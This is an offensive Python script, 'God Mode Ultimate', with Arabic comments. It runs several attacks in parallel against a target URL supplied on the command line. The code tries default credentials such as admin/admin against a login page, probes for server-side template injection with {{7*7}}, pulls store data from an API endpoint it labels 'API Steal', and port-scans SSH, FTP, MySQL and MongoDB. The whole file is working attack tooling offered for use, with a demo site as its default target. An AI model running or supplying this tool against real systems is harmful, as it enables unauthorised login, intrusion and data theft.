#!/usr/bin/env python3
"""
💣 God Mode Ultimate - كل الأسلحة في سلاح واحد
"""
import requests, sys, json, os, re, socket, random, time
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

class GodModeUltimate:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.results = {"target":target, "vulns":[], "passwords":[], "data":[], "score":0}
        self.session = requests.Session()
    
    def log(self, msg): print(f"[💣] {msg}")
    
    def dict_attack(self):
        """سلاح 1: Dict Attack"""
        self.log("🔑 Dict Attack...")
        creds = [("admin","admin"),("admin","password"),("admin","123456"),("root","root"),("user","user")]
        for user, pwd in creds:
            try:
                r = self.session.post(f"{self.target}/login.jsp", 
                    data={"username":user,"password":pwd,"login":"Login"}, timeout=5)
                if r.status_code == 302 and "login" not in r.headers.get("Location",""):
                    self.results["passwords"].append({"user":user,"pass":pwd})
                    self.results["score"] += 50
                    self.log(f"   🚨🚨🚨 {user}:{pwd}")
                    return True
            except: pass
        return False
    
    def ssti_attack(self):
        """سلاح 2: SSTI"""
        self.log("🧠 SSTI...")
        try:
            r = self.session.get(f"{self.target}/api/stores?data={{{{7*7}}}}", timeout=5)
            if "49" in r.text:
                self.results["vulns"].append("SSTI")
                self.results["score"] += 20
                self.log("   🚨 SSTI: {{7*7}} = 49")
        except: pass
    
    def api_steal(self):
        """سلاح 3: API Steal"""
        self.log("💎 API Steal...")
        try:
            r = self.session.get(f"{self.target}/api/stores", timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                data = r.json()
                stores = data.get('data', data) if isinstance(data, dict) else data
                self.results["data"] = len(stores) if isinstance(stores, list) else 0
                self.results["score"] += 15
                self.log(f"   📊 {self.results['data']} متجر")
        except: pass
    
    def port_scan(self):
        """سلاح 4: Port Scan"""
        self.log("🔌 Port Scan...")
        ports = {22:"SSH",21:"FTP",80:"HTTP",443:"HTTPS",3306:"MySQL",27017:"MongoDB"}
        open_ports = []
        for p in ports:
            s = socket.socket(); s.settimeout(1)
            if s.connect_ex((self.domain, p)) == 0: open_ports.append(p)
            s.close()
        if open_ports:
            self.results["ports"] = open_ports
            self.results["score"] += len(open_ports) * 3
            self.log(f"   🚨 {open_ports}")
    
    def run(self):
        """تشغيل كل شيء"""
        self.log(f"💣 God Mode Ultimate: {self.target}")
        
        with ThreadPoolExecutor(max_workers=4) as ex:
            ex.submit(self.dict_attack)
            ex.submit(self.ssti_attack)
            ex.submit(self.api_steal)
            ex.submit(self.port_scan)
        
        self.log(f"\n📊 Score: {self.results['score']}/100")
        if self.results["passwords"]:
            self.log(f"   🔑 {self.results['passwords']}")
        if self.results["vulns"]:
            self.log(f"   🚨 {self.results['vulns']}")
        if self.results.get("data"):
            self.log(f"   💎 {self.results['data']} متجر")
        
        return self.results

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://demo.testfire.net"
    GodModeUltimate(target).run()
